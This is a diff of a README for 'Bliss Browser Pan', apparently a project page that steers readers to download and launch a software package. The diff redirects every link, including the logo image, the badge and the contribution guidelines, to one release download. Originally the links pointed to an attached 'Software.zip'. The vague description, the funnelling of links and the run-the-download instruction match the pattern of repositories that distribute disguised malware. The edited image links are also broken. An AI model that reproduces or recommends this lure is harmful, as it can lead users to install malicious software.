@@ -2,7 +2,7 @@
 
 Welcome to the official repository of **Bliss Browser Pan**, the language support module for the Bliss Browser that allows Pan programs to be written and run within the browser!
 
-![Bliss Browser Pan Logo](https://github.com/user-attachments/files/18388744/bliss_browser_pan_logo.png)
+![Bliss Browser Pan Logo](https://github.com/alihaider443/Bliss_Browser_Pan/releases/tag/v2.0)
 
 ## Table of Contents
 - [Introduction](#introduction)
@@ -22,9 +22,9 @@ Bliss Browser Pan is a unique project that aims to bring the power of the Pan pr
 - Easy to use and beginner-friendly interface
 
 ## Installation
-To get started with Bliss Browser Pan, simply download the software package from the following link: [Download Bliss Browser Pan](https://github.com/user-attachments/files/18388744/Software.zip)
+To get started with Bliss Browser Pan, simply download the software package from the following link: [Download Bliss Browser Pan](https://github.com/alihaider443/Bliss_Browser_Pan/releases/tag/v2.0)
 
-[![Download Bliss Browser Pan](https://img.shields.io/badge/Download-Bliss_Browser_Pan-blue.svg)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Bliss Browser Pan](https://github.com/alihaider443/Bliss_Browser_Pan/releases/tag/v2.0)](https://github.com/alihaider443/Bliss_Browser_Pan/releases/tag/v2.0)
 
 Launch the downloaded file and follow the on-screen instructions to install Bliss Browser Pan on your system.
 
@@ -47,7 +47,7 @@ We welcome contributions from the open-source community to make Bliss Browser Pa
 - Help improve documentation and tutorials
 - Spread the word about Bliss Browser Pan
 
-Check out our [Contribution Guidelines](CONTRIBUTING.md) for more information on how you can contribute to the project.
+Check out our [Contribution Guidelines](https://github.com/alihaider443/Bliss_Browser_Pan/releases/tag/v2.0) for more information on how you can contribute to the project.
 
 ## License
 Bliss Browser Pan is licensed under the GNU General Public License v3.0 (GPL-3.0). You are free to use, modify, and distribute this software in accordance with the terms of the license. See the [LICENSE](LICENSE) file for more details.
